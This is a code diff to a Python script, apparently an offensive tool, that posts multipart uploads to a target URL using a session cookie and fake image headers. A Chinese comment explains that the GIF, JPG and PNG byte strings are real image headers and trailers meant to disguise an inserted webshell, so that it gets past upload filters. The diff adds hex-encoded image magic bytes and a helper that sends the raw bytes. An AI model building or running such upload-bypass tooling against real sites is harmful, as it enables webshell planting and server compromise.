@@ -11,6 +11,11 @@ from exp10it import get_param_part_from_content
 from exp10it import CONTENT_TYPE_LIST
 
 
+def unicode_to_bytes(unicode_string):
+    # 获取变量如'a\xff'的二进制结果:b'a\xff'
+    return b"".join([b'%c' % ord(each_unicode) for each_unicode in unicode_string])
+
+
 def get_form_data_post_info(url, cookie):
     # 获取通过multipart_form_data上传文件的信息
     # return_value['form_data_dict']为multipart form data中的非文件参数字典
@@ -78,7 +83,7 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
     opener = urllib.request.build_opener(proxy)
     urllib.request.install_opener(opener)
     req = urllib.request.Request(
-        url, headers=headers, data=data.encode("utf-8"))
+        url, headers=headers, data=unicode_to_bytes(data))
     with urllib.request.urlopen(req) as response:
         code = response.code
         html = response.read()
@@ -270,17 +275,29 @@ args = parser.parse_args()
 url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
-gif_file_content = '''GIF89a
-something'''
-jpg_file_content = '''00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
+"""gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前
+gif_file_content = '''
+00000000: 4749 4638 3961 c800 c800 f700 0000 0000  GIF89a..........
+00000010: 0000 3900 0041 0000 3100 0008 0000 2900  ..9..A..1.....).
+0007c700: 84a2 2c6a 0545 109e 8160 2045 c896 7284  ..,j.E...` E..r.
+0007c710: 9f59 0100 cf88 80cd 5944 4000 003b       .Y......YD@..;
+'''
+jpg_file_content = '''
+00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
 00000010: 0048 0000 ffdb 0043 0003 0202 0202 0203  .H.....C........
 00000020: 4bff 007f 3ffa f457 4660 8327 f729 ff00  K...?..WF`.'.)..
-00000030: 7c8a 2b4b 3ee3 e63f ffd9                 |.+K>..?..'''
-png_file_content = '''00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
+00000030: 7c8a 2b4b 3ee3 e63f ffd9                 |.+K>..?..
+'''
+png_file_content = '''
+00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
 00000010: 0000 0118 0000 00d2 0806 0000 0091 8adf  ................
 00000020: 6500 3138 304b 4242 b9fe 053d 0000 0000  e.180KBB...=....
 00000030: 4945 4e44 ae42 6082                      IEND.B`.
 '''
+"""
+gif_file_content = '\x47\x49\x46\x38\x39\x61\xc8\x00\xc8\x00\xf7\x00\x00\x00\x00\x00\x00\x00\x39\x00\x00\x41\x00\x00\x31\x00\x00\x08\x00\x00\x29\x00\x84\xa2\x2c\x6a\x05\x45\x10\x9e\x81\x60\x20\x45\xc8\x96\x72\x84\x9f\x59\x01\x00\xcf\x88\x80\xcd\x59\x44\x40\x00\x00\x3b'
+jpg_file_content = '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x4b\xff\x00\x7f\x3f\xfa\xf4\x57\x46\x60\x83\x27\xf7\x29\xff\x00\x7c\x8a\x2b\x4b\x3e\xe3\xe6\x3f\xff\xd9'
+png_file_content = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x01\x18\x00\x00\x00\xd2\x08\x06\x00\x00\x00\x91\x8a\xdf\x65\x00\x31\x38\x30\x4b\x42\x42\xb9\xfe\x05\x3d\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'
 info = get_form_data_post_info(url, cookie)
 form_data_dict = info['form_data_dict']
 form_file_param_name = info['form_file_param_name']
